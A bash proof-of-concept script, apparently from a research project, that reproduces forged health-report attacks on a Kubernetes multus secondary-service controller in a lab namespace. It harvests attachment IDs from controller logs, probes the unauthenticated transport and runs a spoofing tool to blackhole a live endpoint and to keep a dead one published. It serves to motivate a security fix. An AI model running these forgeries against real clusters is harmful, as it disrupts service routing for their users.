#!/usr/bin/env bash
# Reproduces the forged-health-report attack against the running system.
#
# Establishes a healthy victim endpoint, then, from a process holding no agent
# credential, forges health evidence for it and measures what the Service
# resolves to. This is the motivating experiment for treating secondary
# endpoint publication as an authority problem rather than a plumbing one.
set -u

NS=${NS:-ms-attack}
SVC=amf-victim
SLICE="$SVC-secondary-ipv4"
CTRL_NS=${CTRL_NS:-multus-service-system}
CTRL=${CTRL:-multus-service-controller}
NODE=${NODE:-$(hostname)}
TARGET_IP=${TARGET_IP:-10.216.0.200}
FIXTURES="$(cd "$(dirname "$0")/../test/fixtures" && pwd)"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

ok()   { printf '  \033[32m%s\033[0m %s\n' "OBSERVED" "$1"; }
bad()  { printf '  \033[31m%s\033[0m %s\n' "NOT SEEN" "$1"; }
head_(){ printf '\n\033[1m%s\033[0m\n' "$1"; }
retry(){ local d=$(( $(date +%s)+$1 )); shift; while :; do eval "$@" && return 0; [ "$(date +%s)" -ge "$d" ] && return 1; sleep 0.5; done; }
k(){ kubectl -n "$NS" "$@"; }

dns(){ k exec dnsprobe -- nslookup "$SVC.$NS.svc.cluster.local" 2>/dev/null | awk '/^Address/{print $NF}' | grep -v ':53$'; }
# fraction of a window the victim IP is present in DNS
dns_presence() {
  local secs=$1 present=0 total=0
  local end=$(( $(date +%s)+secs ))
  while [ "$(date +%s)" -lt "$end" ]; do
    total=$((total+1))
    dns | grep -q "^$VIP$" && present=$((present+1))
    sleep 0.5
  done
  echo "$present/$total"
}

cleanup(){ head_ "cleanup"; kubectl delete ns "$NS" --ignore-not-found --wait=false >/dev/null 2>&1; "$FIXTURES/lab.sh" down >/dev/null 2>&1; }
trap cleanup EXIT

head_ "setup: healthy victim endpoint, published the legitimate way"
kubectl get ns "$NS" >/dev/null 2>&1 && { kubectl delete ns "$NS" --wait=false >/dev/null 2>&1; retry 240 '! kubectl get ns "$NS" >/dev/null 2>&1'; }
kubectl create ns "$NS" >/dev/null
"$FIXTURES/lab.sh" up-local >/dev/null

cat <<EOP | kubectl apply -f - >/dev/null
apiVersion: k8s.cni.cncf.io/v1
kind: NetworkAttachmentDefinition
metadata:
  name: sec-victim
  namespace: $NS
  annotations:
    secondary-service.boanlab.io/probe-scope: endpoint
    secondary-service.boanlab.io/health-target: "$TARGET_IP"
spec:
  config: '{"cniVersion":"0.3.1","name":"sec-victim","plugins":[{"type":"macvlan","master":"mslab0","mode":"bridge","ipam":{"type":"host-local","ranges":[[{"subnet":"10.216.0.0/24","rangeStart":"10.216.0.10","rangeEnd":"10.216.0.99"}]]}}]}'
---
apiVersion: k8s.cni.cncf.io/v1
kind: NetworkAttachmentDefinition
metadata: {name: sec-victim-target, namespace: $NS}
spec:
  config: '{"cniVersion":"0.3.1","name":"sec-victim-target","plugins":[{"type":"macvlan","master":"mslab0","mode":"bridge","ipam":{"type":"static","addresses":[{"address":"$TARGET_IP/24"}]}}]}'
---
apiVersion: v1
kind: Service
metadata:
  name: $SVC
  namespace: $NS
  annotations:
    secondary-service.boanlab.io/network: sec-victim
    secondary-service.boanlab.io/workload-selector: app=victim
spec:
  clusterIP: None
  ports: [{name: n2, port: 8080, protocol: TCP}]
---
apiVersion: v1
kind: Pod
metadata: {name: victim, namespace: $NS, labels: {app: victim}, annotations: {k8s.v1.cni.cncf.io/networks: sec-victim}}
spec:
  nodeSelector: {kubernetes.io/hostname: $NODE}
  containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"]}]
---
apiVersion: v1
kind: Pod
metadata: {name: tgt, namespace: $NS, annotations: {k8s.v1.cni.cncf.io/networks: sec-victim-target}}
spec:
  nodeSelector: {kubernetes.io/hostname: $NODE}
  containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"]}]
---
apiVersion: v1
kind: Pod
metadata: {name: dnsprobe, namespace: $NS}
spec:
  containers: [{name: sh, image: docker.io/library/busybox:1.36, command: ["sh","-c","sleep infinity"]}]
EOP

retry 240 '[ "$(k get pod victim tgt dnsprobe --no-headers 2>/dev/null | grep -c Running)" = "3" ]' || { bad "fixtures never started"; exit 1; }
retry 120 'k get endpointslice "$SLICE" >/dev/null 2>&1'
retry 120 'k get endpointslice "$SLICE" -o jsonpath="{.endpoints[0].conditions.ready}" 2>/dev/null | grep -q true'
VIP=$(k get endpointslice "$SLICE" -o jsonpath='{.endpoints[0].addresses[0]}')

# Everything the attacker needs is derivable from cluster-visible objects.
PODUID=$(k get pod victim -o jsonpath='{.metadata.uid}')
AID=$(kubectl -n "$CTRL_NS" logs deploy/"$CTRL" --since=15m 2>/dev/null \
      | grep '"event":"attachment_discovered"' | grep "\"pod_uid\":\"$PODUID\"" | tail -1 \
      | grep -o '"attachment_id":"[^"]*"' | cut -d'"' -f4)
IFACE=$(k get pod victim -o jsonpath='{.metadata.annotations.k8s\.v1\.cni\.cncf\.io/network-status}' \
        | python3 -c "import json,sys
for e in json.load(sys.stdin):
    if not e.get('default'): print(e['interface']); break")
CTRL_ADDR="$(kubectl -n "$CTRL_NS" get svc "$CTRL" -o jsonpath='{.spec.clusterIP}'):9090"
echo "  victim ip=$VIP attachment=$AID iface=$IFACE node=$NODE"
echo "  controller transport (no auth) reachable at $CTRL_ADDR"
retry 30 'bash -c "exec 3<>/dev/tcp/${CTRL_ADDR%:*}/9090" 2>/dev/null' && ok "any workload can reach the transport; no NetworkPolicy, no credential" || bad "transport unreachable"

echo "  baseline DNS over 5s (no attacker):"
echo "    victim present: $(dns_presence 5)"

# ---------------------------------------------------------------- A1
head_ "A1  Availability: forge local_ready=false for a LIVE endpoint"
( cd "$ROOT" && go run ./test/tools/spoof --addr "$CTRL_ADDR" --node "$NODE" \
    --attachment "$AID" --nad "$NS/sec-victim" --interface "$IFACE" --ip "$VIP" \
    --attack withdraw --duration 20s ) > /tmp/spoof_a1.log 2>&1 &
SP=$!
sleep 3
if kubectl -n "$CTRL_NS" logs deploy/"$CTRL" --since=30s 2>/dev/null \
   | grep '"event":"health_report_applied"' | grep "\"attachment_id\":\"$AID\"" | tail -1 | grep -q '"local_ready":false'; then
  ok "controller APPLIED a forged report from a process with no agent credential"
else
  bad "forged report was not applied"
fi
echo "  victim DNS presence over 12s WHILE attacker runs: $(dns_presence 12)"
if ! dns | grep -q "^$VIP$"; then
  ok "victim address REMOVED from Service DNS by forgery -- live endpoint blackholed to clients"
else
  bad "victim still resolvable"
fi
wait $SP 2>/dev/null; tail -1 /tmp/spoof_a1.log | sed 's/^/  attacker: /'
retry 60 'dns | grep -q "^$VIP$"' && ok "recovers once the attacker stops (real agent reclaims)" || bad "did not recover"

# ---------------------------------------------------------------- A2
head_ "A2  Integrity/blackhole: keep a DEAD path published"
echo "  killing the health target so the real path is genuinely down"
k delete pod tgt --wait=true >/dev/null 2>&1
retry 90 '! dns | grep -q "^$VIP$"' && ok "legitimately withdrawn once the path failed (real agent, honest)" \
  || { bad "endpoint did not withdraw on real failure"; }
echo "  now forging healthy evidence for the dead endpoint:"
( cd "$ROOT" && go run ./test/tools/spoof --addr "$CTRL_ADDR" --node "$NODE" \
    --attachment "$AID" --nad "$NS/sec-victim" --interface "$IFACE" --ip "$VIP" \
    --attack keepalive --duration 20s ) > /tmp/spoof_a2.log 2>&1 &
SP=$!
sleep 4
echo "  victim DNS presence over 12s WHILE attacker forges health (path is dead): $(dns_presence 12)"
if dns | grep -q "^$VIP$"; then
  ok "DEAD endpoint kept in Service DNS by forgery -- clients steered into a blackhole"
else
  bad "forged healthy evidence did not revive the dead endpoint"
fi
wait $SP 2>/dev/null; tail -1 /tmp/spoof_a2.log | sed 's/^/  attacker: /'

# ---------------------------------------------------------------- G1 sanity
head_ "G1 (holds today) Non-creation: a report cannot invent an endpoint"
before=$(k get endpointslice "$SLICE" -o jsonpath='{.endpoints[*].addresses[0]}' 2>/dev/null | tr ' ' '\n' | grep -c . || true)
( cd "$ROOT" && go run ./test/tools/healthreport --addr "$CTRL_ADDR" --node "$NODE" \
    --instance ghost --case unknown-attachment ) >/dev/null 2>&1
sleep 2
if kubectl -n "$CTRL_NS" logs deploy/"$CTRL" --since=20s 2>/dev/null | grep -q '"reason":"unknown attachment"'; then
  ok "invented attachment rejected -- the Registry already blocks non-creation"
else
  bad "unknown attachment not rejected"
fi

head_ "summary"
echo "  A1 forged withdrawal of a live endpoint:  see presence fraction above"
echo "  A2 forged keep-alive of a dead endpoint:  see presence fraction above"
echo "  G1 non-creation:                          already enforced by the Registry"
echo
echo "  The gap both A1 and A2 exploit: the controller trusts envelope.node and"
echo "  the newest stream wins. Node identity is self-asserted, so any workload"
echo "  that can reach the transport can speak for any node's endpoints."
